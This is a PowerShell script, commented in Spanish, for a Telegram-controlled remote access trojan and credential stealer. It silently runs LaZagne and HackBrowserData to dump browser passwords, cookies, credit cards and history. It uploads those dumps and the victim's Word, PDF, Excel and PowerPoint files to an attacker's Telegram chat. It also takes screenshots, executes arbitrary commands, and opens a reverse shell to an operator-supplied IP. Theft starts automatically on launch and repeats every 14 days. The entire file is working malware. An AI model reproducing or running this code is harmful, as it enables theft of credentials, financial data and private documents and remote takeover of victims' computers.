param(
    [Parameter(Mandatory=$true)]
    [string]$Token,
    
    [Parameter(Mandatory=$true)] 
    [string]$ChatId
)

# === CONFIGURACION ===
$ApiUrl = "https://api.telegram.org/bot$Token"
$LogFile = "$env:APPDATA\CarpetaDos\bot.log"
$HackPath = "$env:APPDATA\CarpetaDos\hackbrowserdata.exe"
$LaZagnePath = "$env:APPDATA\CarpetaDos\lazagne.exe"
$StateFile = "$env:APPDATA\CarpetaDos\bot_state.json"

# Variables de sesion
$script:CurrentDir = $PWD.Path
$script:LastStealTime = $null
$script:ProcessedUpdates = @{}
$script:Lock = New-Object System.Object
$script:ReverseShellActive = $false
$script:ShellClient = $null
$script:ShellStream = $null
$script:FilesExfiltrated = $false
$script:BrowserDataSent = $false
$script:ArchivosComprimidosEnviados = 0

New-Item -ItemType Directory -Path (Split-Path $LogFile) -Force -ErrorAction SilentlyContinue | Out-Null

# === FUNCIONES BASICAS ===
function Write-Log {
    param([string]$Message)
    $line = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message"
    try { Add-Content -Path $LogFile -Value $line -ErrorAction SilentlyContinue } catch {}
    Write-Host $line
}

function Send-Message {
    param([string]$Text)
    try {
        if ($Text.Length -gt 4000) { $Text = $Text.Substring(0, 4000) + "`n...(truncado)" }
        $body = @{ chat_id = $ChatId; text = $Text } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "$ApiUrl/sendMessage" -Method Post -ContentType "application/json" -Body $body | Out-Null
        return $true
    } catch {
        Write-Log "Error mensaje: $($_.Exception.Message)"
        return $false
    }
}

function Send-File {
    param([string]$Path, [string]$Caption = "")
    try {
        if (-not (Test-Path $Path)) { return $false }
        
        $args = @(
            "-s", "-X", "POST",
            "https://api.telegram.org/bot$Token/sendDocument",
            "-F", "chat_id=$ChatId",
            "-F", "document=@$Path"
        )
        if ($Caption) { $args += "-F", "caption=$Caption" }
        
        $result = & curl.exe @args 2>&1 | ConvertFrom-Json
        if ($result.ok) {
            Write-Log "Archivo enviado: $(Split-Path $Path -Leaf)"
            return $true
        }
        return $false
    } catch {
        Write-Log "Error archivo: $($_.Exception.Message)"
        return $false
    }
}

# === INFO DEL SISTEMA ===
function Get-Info {
    try {
        $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip
    } catch { $ip = "Desconocida" }
    try {
        $os = (Get-CimInstance Win32_OperatingSystem).Caption
    } catch { $os = "Windows" }
    return "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip | OS: $os"
}

# === SCREENSHOT ===
function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bitmap = New-Object System.Drawing.Bitmap($screen.Bounds.Width, $screen.Bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
        
        $path = "$env:TEMP\ss_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose()
        $bitmap.Dispose()
        
        Send-File -Path $path -Caption "Screenshot $(Get-Date -Format 'HH:mm:ss')"
        Remove-Item $path -Force -ErrorAction SilentlyContinue
        return $true
    } catch {
        Write-Log "Error screenshot: $($_.Exception.Message)"
        Send-Message -Text "Error capturando: $($_.Exception.Message)"
        return $false
    }
}

# === EJECUTAR LAZAGNE ===
function Run-LaZagne {
    param([string]$OutputDir)
    
    if (-not (Test-Path $LaZagnePath)) {
        Write-Log "LaZagne.exe no encontrado"
        return $false
    }
    
    Write-Log "Ejecutando LaZagne..."
    
    try {
        # Ejecutar LaZagne para todos los navegadores
        $outputFile = "$OutputDir\lazagne_browsers.txt"
        $p = Start-Process -FilePath $LaZagnePath -ArgumentList "browsers -oN `"$outputFile`"" -PassThru -WindowStyle Hidden
        $p.WaitForExit(120000)
        if (-not $p.HasExited) { $p.Kill() }
        
        if (Test-Path $outputFile) {
            $size = (Get-Item $outputFile).Length
            Write-Log "LaZagne completado. Archivo: $size bytes"
            return $true
        }
    } catch {
        Write-Log "Error ejecutando LaZagne: $_"
    }
    
    return $false
}

# === EJECUTAR HACKBROWSERDATA ===
function Run-HackBrowserData {
    param([string]$OutputDir)
    
    if (-not (Test-Path $HackPath)) {
        Write-Log "hackbrowserdata.exe no encontrado"
        return $false
    }
    
    Write-Log "Ejecutando HackBrowserData..."
    
    try {
        $p = Start-Process -FilePath $HackPath -ArgumentList "dump -d `"$OutputDir`" -f json" -PassThru -WindowStyle Hidden
        $p.WaitForExit(120000)
        if (-not $p.HasExited) { $p.Kill() }
        
        Write-Log "HackBrowserData completado"
        return $true
    } catch {
        Write-Log "Error ejecutando HackBrowserData: $_"
    }
    
    return $false
}

# === STEAL DATA - EJECUTA AMBAS HERRAMIENTAS ===
function Steal-Data {
    param([switch]$Auto = $false)
    
    Send-Message -Text "Iniciando extraccion con ambas herramientas...`n1. LaZagne (mejor para contraseñas)`n2. HackBrowserData (datos generales)"
    Write-Log "Iniciando extraccion dual - Objetivo: 8 archivos comprimidos"
    
    $intentos = 0
    $maxIntentos = 5
    
    while ($script:ArchivosComprimidosEnviados -lt 8 -and $intentos -lt $maxIntentos) {
        $intentos++
        Write-Log "Intento $intentos de $maxIntentos - Archivos enviados: $($script:ArchivosComprimidosEnviados)"
        
        # Cerrar navegadores
        $existing = Get-Process @("chrome","msedge","firefox","brave","opera") -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id
        
        $outDir = "$env:TEMP\br_$(Get-Date -Format 'yyyyMMdd_HHmmss')_$intentos"
        New-Item -ItemType Directory -Path $outDir -Force | Out-Null
        
        # === EJECUTAR AMBAS HERRAMIENTAS ===
        $lazagneSuccess = Run-LaZagne -OutputDir $outDir
        Start-Sleep -Seconds 2
        
        $hackSuccess = Run-HackBrowserData -OutputDir $outDir
        Start-Sleep -Seconds 2
        
        # Reabrir navegadores si es necesario
        Get-Process @("chrome","msedge","firefox","brave","opera") -ErrorAction SilentlyContinue | Where-Object { $existing -notcontains $_.Id } | ForEach-Object {
            try { $_.Kill() } catch {}
        }
        
        # === CREAR ARCHIVOS POR TIPO CON FUENTE ===
        $tiposArchivos = @(
            @{ Nombre = "bookmark"; Tipo = "bookmarks"; Fuentes = @() }
            @{ Nombre = "cookie"; Tipo = "cookies"; Fuentes = @() }
            @{ Nombre = "download"; Tipo = "downloads"; Fuentes = @() }
            @{ Nombre = "extension"; Tipo = "extensions"; Fuentes = @() }
            @{ Nombre = "history"; Tipo = "history"; Fuentes = @() }
            @{ Nombre = "localstorage"; Tipo = "localstorage"; Fuentes = @() }
            @{ Nombre = "password"; Tipo = "passwords"; Fuentes = @() }
            @{ Nombre = "creditcard"; Tipo = "creditcards"; Fuentes = @() }
        )
        
        # Buscar archivos de ambas fuentes
        $allJsonFiles = Get-ChildItem $outDir -Filter "*.json" -Recurse -ErrorAction SilentlyContinue
        $allTxtFiles = Get-ChildItem $outDir -Filter "*.txt" -Recurse -ErrorAction SilentlyContinue
        
        Write-Log "Archivos encontrados - JSON: $($allJsonFiles.Count), TXT: $($allTxtFiles.Count)"
        
        # Procesar cada tipo
        for ($i = 0; $i -lt $tiposArchivos.Count; $i++) {
            $tipoInfo = $tiposArchivos[$i]
            $nombreZip = $tipoInfo.Nombre
            $tipoBusqueda = $tipoInfo.Tipo
            $zipPath = "$env:TEMP\$nombreZip.zip"
            $archivosParaZip = @()
            $fuentesEncontradas = @()
            
            # Buscar archivos JSON de HackBrowserData
            foreach ($file in $allJsonFiles) {
                if ($file.Name -like "*$tipoBusqueda*") {
                    $archivosParaZip += $file.FullName
                    if (-not ($fuentesEncontradas -contains "HackBrowserData")) {
                        $fuentesEncontradas += "HackBrowserData"
                    }
                }
            }
            
            # Para passwords, agregar archivo de LaZagne
            if ($nombreZip -eq "password" -and $lazagneSuccess) {
                $lazagneFile = "$outDir\lazagne_browsers.txt"
                if (Test-Path $lazagneFile) {
                    $archivosParaZip += $lazagneFile
                    if (-not ($fuentesEncontradas -contains "LaZagne")) {
                        $fuentesEncontradas += "LaZagne"
                    }
                    Write-Log "Agregado archivo de LaZagne a password.zip"
                }
            }
            
            # Crear ZIP
            if ($archivosParaZip.Count -gt 0) {
                Compress-Archive -Path $archivosParaZip -DestinationPath $zipPath -Force
                $tamanoMB = [math]::Round((Get-Item $zipPath).Length / 1MB, 2)
                
                $fuenteTexto = if ($fuentesEncontradas.Count -gt 0) { 
                    "Fuente: $($fuentesEncontradas -join ' + ')" 
                } else { 
                    "Fuente: Desconocida" 
                }
                
                $caption = "[$($i+1)/8] [$nombreZip.zip] $($tipoInfo.Tipo)`nArchivos: $($archivosParaZip.Count)`nTamano: $tamanoMB MB`n$fuenteTexto`nPC: $env:COMPUTERNAME"
                
                if (Send-File -Path $zipPath -Caption $caption) {
                    $script:ArchivosComprimidosEnviados++
                    Write-Log "ZIP $nombreZip.zip ($($i+1)/8) enviado. Total: $($script:ArchivosComprimidosEnviados)"
                } else {
                    Write-Log "ERROR al enviar $nombreZip.zip"
                }
            } else {
                # Crear ZIP vacio con info
                $infoPath = "$env:TEMP\info_$nombreZip.txt"
                $infoContent = @"
=== $nombreZip ===
Fecha: $(Get-Date)
PC: $env:COMPUTERNAME
Usuario: $env:USERNAME
Tipo: $($tipoInfo.Tipo)
Estado: No se encontraron datos
Herramientas ejecutadas:
- LaZagne: $(if($lazagneSuccess){"OK"}else{"Fallo"})
- HackBrowserData: $(if($hackSuccess){"OK"}else{"Fallo"})
Nota: Chrome/Edge 127+ usa App-Bound Encryption
"@
                $infoContent | Out-File $infoPath -Encoding UTF8
                Compress-Archive -Path $infoPath -DestinationPath $zipPath -Force
                Remove-Item $infoPath -Force -ErrorAction SilentlyContinue
                
                $caption = "[$($i+1)/8] [$nombreZip.zip] $($tipoInfo.Tipo)`nEstado: Sin datos`nLaZagne: $(if($lazagneSuccess){'OK'}else{'Fallo'}) | HBD: $(if($hackSuccess){'OK'}else{'Fallo'})`nPC: $env:COMPUTERNAME"
                
                if (Send-File -Path $zipPath -Caption $caption) {
                    $script:ArchivosComprimidosEnviados++
                    Write-Log "ZIP vacio $nombreZip.zip ($($i+1)/8) enviado. Total: $($script:ArchivosComprimidosEnviados)"
                }
            }
            
            Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 2
        }
        
        # Limpiar
        if (Test-Path $outDir) { Remove-Item $outDir -Recurse -Force -ErrorAction SilentlyContinue }
        
        if ($script:ArchivosComprimidosEnviados -lt 8) {
            Write-Log "Faltan archivos ($($script:ArchivosComprimidosEnviados)/8). Reintentando..."
            Send-Message -Text "Faltan $(8 - $script:ArchivosComprimidosEnviados) archivos. Reintentando..."
            Start-Sleep -Seconds 5
        }
    }
    
    if ($script:ArchivosComprimidosEnviados -ge 8) {
        $script:BrowserDataSent = $true
        $script:LastStealTime = Get-Date
        Save-State
        Send-Message -Text "COMPLETADO: 8 archivos enviados.`n`nFuentes utilizadas:`n- LaZagne.exe (mejor para contraseñas)`n- HackBrowserData.exe (datos generales)`n`nArchivos: bookmark, cookie, download, extension, history, localstorage, password, creditcard"
        Write-Log "EXITO: 8 archivos enviados despues de $intentos intentos"
        return $true
    } else {
        Send-Message -Text "ERROR: Solo se enviaron $($script:ArchivosComprimidosEnviados)/8 archivos"
        Write-Log "FALLO: Solo se enviaron $($script:ArchivosComprimidosEnviados)/8 archivos"
        return $false
    }
}

# === EXFILTRACION DE DOCUMENTOS ===
function Exfiltrate-Documents {
    param([switch]$Auto = $false)
    
    if (-not $script:BrowserDataSent) {
        Write-Log "Documentos: Esperando archivos comprimidos primero..."
        Send-Message -Text "Esperando envio de archivos comprimidos primero..."
        return
    }
    
    if ($script:FilesExfiltrated -and $Auto) {
        Write-Log "Documentos ya exfiltrados, saltando..."
        return
    }
    
    Send-Message -Text "Iniciando exfiltracion de documentos...`nCarpetas: Documentos y Descargas (con subcarpetas)`nOrden: Word -> PDF -> Excel -> PowerPoint"
    Write-Log "Iniciando exfiltracion de documentos"
    
    $RutaDocumentos = [Environment]::GetFolderPath([Environment+SpecialFolder]::MyDocuments)
    $RutaDescargas = (New-Object -ComObject Shell.Application).Namespace('shell:Downloads').Self.Path
    
    $carpetasBusqueda = @()
    if (Test-Path $RutaDocumentos) { $carpetasBusqueda += $RutaDocumentos }
    if (Test-Path $RutaDescargas) { $carpetasBusqueda += $RutaDescargas }
    
    if ($carpetasBusqueda.Count -eq 0) {
        Send-Message -Text "No se encontraron carpetas"
        return
    }
    
    $PrioridadWord = @('*.docx', '*.doc')
    $PrioridadPDF = @('*.pdf')
    $PrioridadExcel = @('*.xlsx', '*.xls')
    $PrioridadPowerPoint = @('*.pptx', '*.ppt')
    
    $archivosWord = @()
    $archivosPDF = @()
    $archivosExcel = @()
    $archivosPowerPoint = @()
    
    foreach ($carpeta in $carpetasBusqueda) {
        try {
            $archivosWord += Get-ChildItem -Path $carpeta -Include $PrioridadWord -Recurse -File -ErrorAction SilentlyContinue
            $archivosPDF += Get-ChildItem -Path $carpeta -Include $PrioridadPDF -Recurse -File -ErrorAction SilentlyContinue
            $archivosExcel += Get-ChildItem -Path $carpeta -Include $PrioridadExcel -Recurse -File -ErrorAction SilentlyContinue
            $archivosPowerPoint += Get-ChildItem -Path $carpeta -Include $PrioridadPowerPoint -Recurse -File -ErrorAction SilentlyContinue
        } catch {}
    }
    
    $totalArchivos = $archivosWord.Count + $archivosPDF.Count + $archivosExcel.Count + $archivosPowerPoint.Count
    
    if ($totalArchivos -eq 0) {
        Send-Message -Text "No se encontraron documentos."
        $script:FilesExfiltrated = $true
        Save-State
        return
    }
    
    Send-Message -Text "Total documentos: $totalArchivos`nWord: $($archivosWord.Count) | PDF: $($archivosPDF.Count) | Excel: $($archivosExcel.Count) | PPT: $($archivosPowerPoint.Count)"
    
    $enviados = 0
    $errores = 0
    
    # WORD
    if ($archivosWord.Count -gt 0) {
        Send-Message -Text "=== ENVIANDO WORD ==="
        foreach ($archivo in $archivosWord | Sort-Object FullName) {
            $enviados++
            $tamanoMB = [math]::Round($archivo.Length / 1MB, 2)
            $caption = "[$enviados/$totalArchivos] [WORD] $($archivo.Name)`nTamano: $tamanoMB MB`nCarpeta: $($archivo.DirectoryName)"
            if (Send-File -Path $archivo.FullName -Caption $caption) { Write-Log "OK Word: $($archivo.Name)" } else { $errores++ }
            Start-Sleep -Seconds 2
        }
    }
    
    # PDF
    if ($archivosPDF.Count -gt 0) {
        Send-Message -Text "=== ENVIANDO PDF ==="
        foreach ($archivo in $archivosPDF | Sort-Object FullName) {
            $enviados++
            $tamanoMB = [math]::Round($archivo.Length / 1MB, 2)
            $caption = "[$enviados/$totalArchivos] [PDF] $($archivo.Name)`nTamano: $tamanoMB MB`nCarpeta: $($archivo.DirectoryName)"
            if (Send-File -Path $archivo.FullName -Caption $caption) { Write-Log "OK PDF: $($archivo.Name)" } else { $errores++ }
            Start-Sleep -Seconds 2
        }
    }
    
    # EXCEL
    if ($archivosExcel.Count -gt 0) {
        Send-Message -Text "=== ENVIANDO EXCEL ==="
        foreach ($archivo in $archivosExcel | Sort-Object FullName) {
            $enviados++
            $tamanoMB = [math]::Round($archivo.Length / 1MB, 2)
            $caption = "[$enviados/$totalArchivos] [EXCEL] $($archivo.Name)`nTamano: $tamanoMB MB`nCarpeta: $($archivo.DirectoryName)"
            if (Send-File -Path $archivo.FullName -Caption $caption) { Write-Log "OK Excel: $($archivo.Name)" } else { $errores++ }
            Start-Sleep -Seconds 2
        }
    }
    
    # POWERPOINT
    if ($archivosPowerPoint.Count -gt 0) {
        Send-Message -Text "=== ENVIANDO POWERPOINT ==="
        foreach ($archivo in $archivosPowerPoint | Sort-Object FullName) {
            $enviados++
            $tamanoMB = [math]::Round($archivo.Length / 1MB, 2)
            $caption = "[$enviados/$totalArchivos] [POWERPOINT] $($archivo.Name)`nTamano: $tamanoMB MB`nCarpeta: $($archivo.DirectoryName)"
            if (Send-File -Path $archivo.FullName -Caption $caption) { Write-Log "OK PowerPoint: $($archivo.Name)" } else { $errores++ }
            Start-Sleep -Seconds 2
        }
    }
    
    $script:FilesExfiltrated = $true
    Save-State
    Send-Message -Text "Exfiltracion completada.`nTotal: $totalArchivos | Exitosos: $($enviados - $errores) | Errores: $errores"
    Write-Log "Exfiltracion completada. Exitosos: $($enviados - $errores), Errores: $errores"
}

# === REVERSE SHELL ===
function Start-ReverseShell {
    param([string]$IPAddress, [int]$Port = 4444)
    try {
        Send-Message -Text "Conectando a $IPAddress`:$Port ..."
        $script:ReverseShellActive = $true
        $client = New-Object System.Net.Sockets.TCPClient($IPAddress, $Port)
        $script:ShellClient = $client
        $stream = $client.GetStream()
        $script:ShellStream = $stream
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        $writer.WriteLine("=== Reverse Shell Conectado ===`nUsuario: $env:USERNAME`nEquipo: $env:COMPUTERNAME")
        
        while ($script:ReverseShellActive -and $client.Connected) {
            $writer.Write("PS $(Get-Location)> ")
            try {
                $command = $reader.ReadLine()
                if ($command -eq "exit") { break }
                if (-not [string]::IsNullOrWhiteSpace($command)) {
                    try {
                        $output = Invoke-Expression $command 2>&1 | Out-String
                        $writer.WriteLine($output)
                    } catch { $writer.WriteLine("Error: $_") }
                }
            } catch { break }
        }
    } catch {
        Send-Message -Text "Error reverse shell: $_"
    } finally {
        if ($script:ShellStream) { $script:ShellStream.Close() }
        if ($script:ShellClient) { $script:ShellClient.Close() }
        $script:ReverseShellActive = $false
        Send-Message -Text "Reverse shell desconectado."
    }
}

function Stop-ReverseShell {
    $script:ReverseShellActive = $false
    if ($script:ShellStream) { $script:ShellStream.Close() }
    if ($script:ShellClient) { $script:ShellClient.Close() }
    Send-Message -Text "Reverse shell detenido."
}

# === EJECUTAR COMANDO ===
function Run-Command {
    param([string]$Cmd)
    Write-Log "Ejecutando: $Cmd"
    try {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = "cmd.exe"
        $psi.Arguments = "/c $Cmd && cd"
        $psi.WorkingDirectory = $script:CurrentDir
        $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true
        $psi.UseShellExecute = $false
        $psi.CreateNoWindow = $true
        
        $proc = [System.Diagnostics.Process]::Start($psi)
        $stdout = $proc.StandardOutput.ReadToEnd()
        $stderr = $proc.StandardError.ReadToEnd()
        $proc.WaitForExit()
        
        if ($Cmd -match '^cd\s+(.+)$') {
            $newPath = $Matches[1]
            $testPath = if ([System.IO.Path]::IsPathRooted($newPath)) { $newPath } else { Join-Path $script:CurrentDir $newPath }
            $resolved = Resolve-Path $testPath -ErrorAction SilentlyContinue
            if ($resolved) {
                $script:CurrentDir = $resolved.Path
                Send-Message -Text "Directorio: $script:CurrentDir"
                return
            }
        }
        
        $output = $stdout + $stderr
        if ([string]::IsNullOrWhiteSpace($output)) { $output = "(sin salida)" }
        
        $temp = "$env:TEMP\cmd_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        "Comando: $Cmd`nDir: $script:CurrentDir`n$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n$('='*50)`n`n$output" | Out-File $temp -Encoding UTF8
        Send-File -Path $temp -Caption "Salida: $Cmd"
        Remove-Item $temp -Force -ErrorAction SilentlyContinue
    } catch {
        Send-Message -Text "Error: $($_.Exception.Message)"
    }
}

# === ESTADO ===
function Save-State {
    $state = @{
        LastStealTime = if ($script:LastStealTime) { $script:LastStealTime.ToString("o") } else { $null }
        FilesExfiltrated = $script:FilesExfiltrated
        BrowserDataSent = $script:BrowserDataSent
        ArchivosComprimidosEnviados = $script:ArchivosComprimidosEnviados
    }
    $state | ConvertTo-Json | Out-File $StateFile -Encoding UTF8
}

function Load-State {
    if (Test-Path $StateFile) {
        try {
            $state = Get-Content $StateFile | ConvertFrom-Json
            if ($state.LastStealTime) { $script:LastStealTime = [DateTime]::Parse($state.LastStealTime) }
            if ($state.FilesExfiltrated -ne $null) { $script:FilesExfiltrated = $state.FilesExfiltrated }
            if ($state.BrowserDataSent -ne $null) { $script:BrowserDataSent = $state.BrowserDataSent }
            if ($state.ArchivosComprimidosEnviados -ne $null) { $script:ArchivosComprimidosEnviados = $state.ArchivosComprimidosEnviados }
        } catch {}
    }
}

function Check-AutoSteal {
    if (-not $script:BrowserDataSent -or $script:ArchivosComprimidosEnviados -lt 8) {
        Write-Log "Iniciando envio de 8 archivos comprimidos..."
        $stealSuccess = Steal-Data -Auto
        if ($stealSuccess -and -not $script:FilesExfiltrated) {
            Start-Sleep -Seconds 5
            Exfiltrate-Documents -Auto
        }
    } elseif (-not $script:FilesExfiltrated) {
        Write-Log "Exfiltrando documentos pendientes..."
        Exfiltrate-Documents -Auto
    } else {
        $now = Get-Date
        if ($script:LastStealTime -and ($now - $script:LastStealTime).Days -ge 14) {
            Write-Log "Reiniciando ciclo..."
            $script:BrowserDataSent = $false
            $script:FilesExfiltrated = $false
            $script:ArchivosComprimidosEnviados = 0
            Save-State
            Check-AutoSteal
        }
    }
}

# === PROCESAR COMANDOS ===
function Process-Cmd {
    param([string]$Text, [int]$UpdateId)
    
    [void][System.Threading.Monitor]::Enter($script:Lock)
    try {
        if ($script:ProcessedUpdates.ContainsKey($UpdateId)) { return }
        $script:ProcessedUpdates[$UpdateId] = $true
        if ($script:ProcessedUpdates.Count -gt 100) {
            $keys = $script:ProcessedUpdates.Keys | Sort-Object | Select-Object -First 50
            foreach ($k in $keys) { $script:ProcessedUpdates.Remove($k) }
        }
    } finally {
        [System.Threading.Monitor]::Exit($script:Lock)
    }
    
    Write-Log "Procesando: $Text"
    $parts = $Text.Trim() -split '\s+', 2
    $cmd = $parts[0].ToLower()
    $args = if ($parts.Count -gt 1) { $parts[1] } else { "" }
    
    switch ($cmd) {
        "/help" {
            Send-Message -Text @"
Comandos disponibles:

/help - Muestra esta ayuda
/info - Info del sistema
/ls - Listar archivos
/cd <ruta> - Cambiar directorio
/pwd - Directorio actual
/cmd <comando> - Ejecutar comando
/captura - Screenshot
/steal - Extraer 8 archivos (LaZagne + HackBrowserData)
/files - Exfiltrar documentos (Word -> PDF -> Excel -> PowerPoint)
/shell <IP> [puerto] - Reverse shell
/stopshell - Detener reverse shell

FLUJO AUTOMATICO:
1. 8 archivos con indicacion de fuente:
   - bookmark.zip, cookie.zip, download.zip, extension.zip
   - history.zip, localstorage.zip, password.zip, creditcard.zip
   Fuente: LaZagne (mejor passwords) + HackBrowserData (datos)
2. Documentos de Documentos y Descargas (con subcarpetas)
   Orden: Word -> PDF -> Excel -> PowerPoint
"@
        }
        
        "/info" { Send-Message -Text (Get-Info) }
        
        "/ls" {
            try {
                $items = Get-ChildItem $script:CurrentDir | Select-Object Mode, LastWriteTime, Length, Name | Format-Table -AutoSize | Out-String
                Send-Message -Text "Directorio: $script:CurrentDir`n`n$items"
            } catch { Send-Message -Text "Error: $($_.Exception.Message)" }
        }
        
        "/pwd" { Send-Message -Text "Directorio: $script:CurrentDir" }
        
        "/cd" {
            if ($args) { Run-Command -Cmd "cd $args" } else { Send-Message -Text "Uso: /cd <ruta>" }
        }
        
        "/cmd" {
            if ($args) { Run-Command -Cmd $args } else { Send-Message -Text "Uso: /cmd <comando>" }
        }
        
        "/captura" {
            Send-Message -Text "Capturando..."
            Take-Screenshot | Out-Null
        }
        
        "/steal" { 
            $script:ArchivosComprimidosEnviados = 0
            $script:BrowserDataSent = $false
            Steal-Data 
        }
        
        "/files" { Exfiltrate-Documents }
        
        "/shell" {
            if ($script:ReverseShellActive) {
                Send-Message -Text "Ya hay un reverse shell activo. Usa /stopshell primero."
                return
            }
            $shellArgs = $args -split '\s+'
            $ip = $shellArgs[0]
            $port = if ($shellArgs.Count -gt 1) { [int]$shellArgs[1] } else { 4444 }
            if ([string]::IsNullOrWhiteSpace($ip)) {
                Send-Message -Text "Uso: /shell <IP> [puerto]`nEjemplo: /shell 192.168.1.100 4444"
                return
            }
            Start-Job -ScriptBlock ${function:Start-ReverseShell} -ArgumentList $ip, $port | Out-Null
            Start-Sleep -Seconds 2
            Send-Message -Text "Intentando conectar a $ip`:$port ..."
        }
        
        "/stopshell" { Stop-ReverseShell }
        
        default { Write-Log "Comando desconocido: $cmd" }
    }
}

# === INICIO ===
Write-Log "=== BOT INICIADO ==="
Load-State
Send-Message -Text "Bot online - $(Get-Info)`nIniciando secuencia automatica..."

Check-AutoSteal

try {
    Invoke-RestMethod -Uri "$ApiUrl/deleteWebhook?drop_pending_updates=true" -Method Post | Out-Null
    Start-Sleep -Seconds 2
} catch {}

$lastId = 0
while ($true) {
    try {
        $resp = Invoke-RestMethod -Uri "$ApiUrl/getUpdates?offset=$($lastId+1)&limit=1" -TimeoutSec 60
        if ($resp.ok -and $resp.result.Count -gt 0) {
            $upd = $resp.result[0]
            $lastId = $upd.update_id
            if ($upd.message -and $upd.message.text -and ([string]$upd.message.chat.id -eq $ChatId)) {
                Process-Cmd -Text $upd.message.text -UpdateId $upd.update_id
            }
        }
        if ((Get-Date).Minute -eq 0) { Check-AutoSteal }
    } catch {
        $err = $_.Exception.Message
        if ($err -notlike "*409*") { Write-Log "Error: $err" }
        Start-Sleep -Seconds 2
    }
    Start-Sleep -Milliseconds 1500
}
